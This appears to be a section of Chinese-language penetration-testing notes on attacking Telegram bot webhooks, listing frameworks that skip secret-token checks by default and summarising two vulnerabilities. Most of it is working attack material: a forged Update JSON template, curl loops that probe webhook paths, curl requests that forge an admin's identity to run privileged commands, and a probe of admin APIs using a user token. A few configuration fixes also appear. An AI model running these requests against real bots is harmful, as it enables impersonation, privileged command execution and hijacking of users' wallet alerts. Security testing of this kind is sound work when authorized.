## B 面：Webhook/后端攻击

### Webhook 签名校验矩阵

| 框架 | 默认是否校验 secret_token | 安全配置 |
|------|------------------------|---------|
| python-telegram-bot | ❌ 不校验 | `Application.run_webhook(secret_token=...)` |
| aiogram | ❌ 需显式 | `run_webhook(secret_token=...)` |
| telegraf (Node) | ❌ 需显式 | `bot.launch({webhook:{secretToken:...}})` |
| grammY (Node/Deno) | ❌ 需显式 | `webhookCallback(bot, {secretToken:...})` |
| php-telegram-bot | ❌ 需显式 | 自行校验 `X-Telegram-Bot-Api-Secret-Token` header |

**未配置 secret_token = 任何人都能 POST 伪造 Update JSON。**

### CVE-2026-28454 — OpenClaw Webhook 无签名（CVSS 9.1）

```
GHSA-fhvm-j76f-qmjv
webhook 模式未配置 secret → 接受任意 POST →
伪造 message.from.id/chat.id → 绕过 sender 白名单执行特权命令。
```

### F-2026-0005 — Webhook 签名缺失 + Anti-Replay 绕过

```
控制器不验签，且用攻击者可控的 update_id 当反重放键 →
完全绕过 anti-replay → 伪造带有效 auth code 的 /start →
把受害者钱包绑定到自己 TG 账号，截获清算警报。
```

### 伪造 Update 最小骨架

```json
{
  "update_id": 999999,
  "message": {
    "message_id": 1,
    "from": {"id": 67890, "is_bot": false, "first_name": "Attacker"},
    "chat": {"id": 67890, "type": "private"},
    "date": 1700000000,
    "text": "/start VALID_AUTH_CODE_HERE"
  }
}
```

```bash
# 探测 webhook 端点（常见路径）
for path in /webhook /bot /telegram/webhook /api/webhook /api/telegram \
  /bot/webhook /.well-known/telegram; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    "https://target${path}" -H "Content-Type: application/json" \
    -d '{"update_id":1}')
  echo "$path → $code"
done

# 伪造 Update（无 secret_token 时）
curl -s -X POST "https://target/webhook" \
  -H "Content-Type: application/json" \
  -d @fake_update.json

# 伪造 admin 身份执行特权命令
curl -s -X POST "https://target/webhook" \
  -H "Content-Type: application/json" \
  -d '{"update_id":999,"message":{"message_id":1,"from":{"id":ADMIN_ID,"is_bot":false,"first_name":"Admin"},"chat":{"id":ADMIN_ID,"type":"private"},"date":1700000000,"text":"/admin_cmd"}}'
```

### 反代配置错误

- nginx/网关吞掉 `X-Telegram-Bot-Api-Secret-Token` header → 校验永不生效
- webhook 路径可预测（/webhook、/bot、Swagger 暴露）
- `setWebhook` 指向内部地址 → SSRF 面
- CVE-2025-13068：WordPress Telegram Bot & Channel Plugin 存储型 XSS（username 未净化）

### BOLA 路径（管理 API 越权写 Bot 配置）

```bash
# USER Token 打 admin 路径
python3 tools/ops/tg_bot_admin_bac.py probe \
  --base https://授权API --case <案卷> --token "$USER_JWT"
```

---

